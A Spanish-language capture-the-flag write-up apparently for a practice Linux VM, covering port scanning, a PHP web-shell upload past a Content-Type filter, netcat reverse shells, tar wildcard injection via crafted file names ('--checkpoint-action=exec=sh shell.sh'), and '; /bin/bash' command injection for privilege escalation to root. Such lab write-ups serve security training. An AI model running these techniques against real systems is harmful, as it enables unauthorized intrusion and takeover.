------
**IP:** 
**Sistema Operativo:** 
**Distribución:** 
**Vulnerabilidades:** 

----

Bueno vamos a comenzar identificando la IP de la maquina con ayuda de [[Arp-Scan]] de la siguiente manera:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20251026184304.png]]

Como podemos observar nuestra maquina victima tiene la IP `192.168.1.70`, ahora vamos con ayuda del comando ping a tratar de identificar el sistema operativo:
```bash
ping -c 1 192.168.1.70
```

![[Pasted image 20251026184555.png]]

Como podemos observar tenemos un `ttl=64` donde intuimos un sistema operativo Linux.

En este momento ya vamos a realizar un escaneo con [[Nmap]] con el objetivo de identificar puertos abiertos primero:
```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.70 -oG allPorts
```

![[Pasted image 20251026184836.png]]

Como podemos observar detectamos los puertos 80 y 22 abiertos, ahora mediante otro escaneo de [[Nmap]] vamos a intentar identificar versiones y lanzando algunos script básicos de reconocimiento un poco de información:
```bash
nmap -p22,80 -sCV 192.168.1.70 -oN target
```

![[Pasted image 20251026185155.png]]

Podemos observar que nos da las versiones de los servicios y mediante la misma ya nos dice que es un Debian, también con esta versión y una búsqueda con `launchpad` podríamos determinar el `codename`:
![[Pasted image 20251026185853.png]]

en este caso no logramos identificarlo pero abra casos en los que sí.

Continuando con la maquina podemos visitar la web alojada en el puerto 80 para ver que podemos encontrar:

![[{77EBF70A-1AD8-4388-B847-2352DA5F991C}.png]]

vemos que solo tiene ese apartado para subir archivos, Podemos utilizar diferentes herramientas para identificar las tecnologías de la web, en este caso vamos a hacer los [[Whatweb]] y la extensión de Wappalizer:

```bash
whatweb http://192.168.1.70
```

![[{FC9089B9-42B0-41E7-A8E0-DA1AB0B315D7}.png]]

![[{F9959BE8-04F7-4ACA-B5D5-310686143167}.png]]

En sentido de tecnologías no vemos nada en especial.

Bueno para probar vamos a subir una imagen y ver que sucede:

![[{C2627CF3-0B6C-4143-886D-E36EBB3208E2}.png]]

vemos que al subir nos da una especie de error que nos dice que solo podemos subir imágenes, aunque lo que subimos si lo fue. Algo que podemos notar en la URL es que tiene la extensión `.php` esto ya nos dice que la web puede interpretar este código.

Si revisamos nuevamente el wappalizer vamos a ver que ya nos detecta `php` como lenguaje:
![[{3007F2A9-D99A-4C7C-A34F-4EE4D85F83C7}.png]]

Ahora que conocemos esto vamos a enviar un archivo malicioso que contenga código para ejecutar comandos con `php`.

Vamos a crear el archivo `cmd.php` con el siguiente contenido:

![[{C6FF9407-4C80-4632-9465-C0B83608DE45}.png]]

ahora lo que vamos a hacer es a este archivo a subirlo pero esa petición la vamos a capturar con ayuda de Burp Suite y la vamos a mandar al repeater para poder analizarla:

![[{DB272997-2AA6-4AA8-8D17-9FA8A3B9E0AC}.png]]

![[Pasted image 20251026191338.png]]

![[Pasted image 20251026191430.png]]

![[{CF2EA671-5399-41C4-854A-C092C03FC9D4}.png]]

Como podemos observar ya con la petición en el repeater y enviada vemos que nos da un mensaje de que solo son permitidas las imágenes, en esta ocasión al parecer la verificación del archivo se usa el contenido de la cabecera `Content-Type` por lo que vamos a modificarlo para que aparente una imagen y ver si nos permite subir el archivo:

![[Pasted image 20251026191753.png]]

como podemos observar modificamos la cabecera y en la respuesta ya nos dice que se subió y se encuentra en `uploads/cmd.php`, recordemos que este es un archivo malicioso el cual se le debe pasar un parámetro por lo que para ingresar correctamente vamos hacer con `/uploads/cmd.php?cmd=<comando>`:

![[Pasted image 20251026191954.png]]

como podemos observar logramos la ejecución del comando `whoami` por lo que ya tenemos una forma de ejecutar comandos en el servidor.

Ahora que podemos ejecutar comandos lo que vamos a hacer es ejecutar una reverse shell para controlar todo desde consola.

Primero vamos a dejar el puerto 443 de nuestra maquina atacante en escucha:
```bash
nc -nlvp 443
```

![[{09C8F528-B912-4DB0-A944-8685A5EB20EB}.png]]

ya con el puerto en escucha vamos a enviar la revese shell de la siguiente manera:

![[{9B736C15-9264-45E4-93AE-FDF7085B2F96}.png]]

como vemos enviamos la reverse shell y ya deberíamos ver la conexión en nuestra consola:

![[Pasted image 20251026193917.png]]

Podemos observar ya solo vamos a encargarnos de dar el tratamiento a la consola:
```bash
scrip /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset xterm
```

![[{8FFFC902-87FF-45A1-86D9-E080F31C1A19}.png]]

por ultimo ya con la nueva consola exportamos `xterm` para el funcionamiento de comandos básicos como `ctrl + c o ctrl + l`:
![[{2FDA6AA8-CDDB-483C-9712-25AC3AAA4CF5}.png]]

En este punto vamos a realizar un reconocimiento para archivos SUI:
```bash
find / -perm -4000 2>/dev/null
```

![[Pasted image 20251026194942.png]]

No vemos nada especial en realidad por lo que vamos a revisar por tareas cron:
```bash
cat /etc/crontab
```

![[{66F4048E-240F-4B8F-9A6E-A61B1F91B6AE}.png]]

Tampoco vemos nada podemos revisar otra ruta también:
```
ls /var/spool/cron/
```

![[{0B133606-6E4C-4415-973E-2766AEBFB6BA}.png]]

vemos una carpeta `crontabs` pero no logramos acceder ya que no tenemos permisos.

Podemos también buscar por capabilities en el sistema:
```
find / -type f -exec getcat {} \; 2>/dev/null
```

![[Pasted image 20251026195828.png]]

Bueno tampoco podemos observar nada, en este punto lo que vamos a hacer es crearnos un archivo para poder identificar comando ejecutados en el sistema vamos a crear un archivos `procmon.sh` y va a contener lo siguiente:

![[Pasted image 20251026200427.png]]

Bueno con esto lo que hacemos es ver las diferencias entre en los comandos ejecutados en un bucle infinito, el propósito es ver si que comandos se ejecutan en cierto tiempo.

Vamos a ejecutar nuestro script y a dejarlo corriendo hasta ver algo:

![[Pasted image 20251026200816.png]]

vemos comandos que se están ejecutando, en este caso algo que llama nuestra atención es que al momento de ejecutar el binario `tar` esta usando `*` en seco donde podemos hacer una wildcard injection, la base de esta vulnerabilidad es sencilla, se tiene que tener mucho cuidado con como se ejecuta estos comandos como podemos ver no especifica que no se puedan usar mas opciones del binario asignando un `--` y esto puede llevar a que si tenemos permisos en este caso dentro de `/opt/project` para crear archivos podríamos crear archivos que como nombre lleven indicaciones esto haciendo que el binario no los interprete como archivos sino como comandos.

Bueno lo primero que tenemos que tener en cuenta es si tenemos permisos de crear archivos dentro de `/opt/project`:

![[Pasted image 20251026201418.png]]

podemos ver que pertenecemos al grupo `developers` el cual por tiene todos sus permisos dentro de `/opt/project` por lo que vamos a dentro del mismo a proceder a primero crear nuestro script malicioso donde se ejecutara el comando el usuario que realiza la compresión de los archivos y como no sabemos cual es ni que permisos tiene preferible vamos a generar otra reverse shell dentro del archivo `shell.sh` y no olvidemos darle permisos:

![[Pasted image 20251026201757.png]]

ahora ya con esto vamos con los siguiente comandos a crear los archivos que funcionaran como parámetros:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

![[{80CDFC1A-C163-4653-8866-5C8DEA181400}.png]]

ya con esto listo vamos a dejar por el puerto `555` en espera de una conexión:
```bash
nc -nlvp 555
```

![[Pasted image 20251026202532.png]]

Luego de un momento si todo esta correcto vamos a recibir la rever shell como el usuario  `development`:
![[Pasted image 20251026202614.png]]

como hicimos con el anterior usuario vamos a darle tratamiento a la shell para que se pueda utilizar mucho mejor:

```bash
scrip /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset xterm
```

![[Pasted image 20251026202758.png]]

por ultimo exportamos `xterm`:
![[Pasted image 20251026202827.png]]

ya con esto podemos intentar ver con `sudo -l` que comandos podemos usar sin necesidad de pasarle contraseña:

![[Pasted image 20251026202957.png]]

vemos que podemos ejecutar un script como el usuario `alfonso` sin necesidad de pasarle contraseña de la siguiente manera:
```bash
sudo -u alfonso /usr/bin/sysinfo.sh
```

![[{EECC81F8-22C4-48FA-92CA-F1C1145D7D44}.png]]

como podemos observar es que al parecer nos da la opción de ejecutar los comandos `df` y `ps` el problema radica que nos permite pasarle parámetros extra, esto nos puede permitir inyectar un segundo comando de la siguiente manera:
```bash
; /bin/bash
```

![[Pasted image 20251026203358.png]]

como podemos observar al inyectarle ese segundo comando lo que sucede es que nos da una bash pero ahora como `alfonso`.

En este punto ya podemos ver la flag de usuario:

![[{6095B2DC-50C9-44E0-B55F-4D44B24FF004}.png]]

perfecto ahora podemos verificar que se puede hacer de igual forma como super usuario con `sudo -l`:

![[{C1A4E963-B147-4BD5-96BD-5C348A9F50E8}.png]]

vemos que tenemos en este caso un  `binario` el cual podeos ejecutarlo con sudo (permisos de administrador):

![[{4A145BBB-9EF4-4243-B5BD-A00F69DBF434}.png]]

En este caso al script le pasamos un usuario y al parecer nos da la línea que le corresponde del `/etc/passwd`.

En este caso es un binario y por como hace esto podemos intentar ver si esta ejecutando alguno de los comandos como `cat` para el archivo o `grep` para filtrar, para esto vamos a usar el comando `strings`:
```bash
strings /user/bin/silentgets
```

![[Pasted image 20251026204243.png]]

al parecer el comando no lo tenemos. Vamos a traernos el binario a nuestra maquina para poder verlo:

![[{9ACA1B3A-2DB8-423D-A0D0-86A833BD4FE2}.png]]

ya con esto le damos permisos de ejecución:

![[{7C02ACAF-101A-4EBA-9F68-52B8E43AA0EF} 1.png]]

vamos a ver ahora si con `string` las cadenas que se pueden leer y vamos a filtrar por concepto sobre `cat`:
```bash
strings binario | grep 'cat'
```

![[{6C7BFDC8-93B6-4270-8A8F-1A6F0EFBAF8F}.png]]

vemos que al parecer si se usa `cat` pero pero esos `@@` como que es extraño, veamos que pasa con el comando `grep`:
```bash
strings binario | grep 'grep'
```

![[{C69502AA-4EB4-4D48-9B8C-EA3257F2B39E}.png]]

Como podemos observar al parecer lo que le pasamos se inserta en `%s` por lo que podemos intentar ingresar un comando en medio de esto en caso de no estar bien sanitizado:
![[{BA5B8E0D-260B-4154-BB30-6478FD64FE8E}.png]]

perfecto ya estamos como root, con esto ya podemos ver la flag del usuario root:

![[{1E5DF19B-2FD9-443A-B7C3-57F22F1B4310}.png]]

Con esto tenemos terminada la maquina.

![[{75D15725-A61A-46A5-B518-70391913AF43}.png]]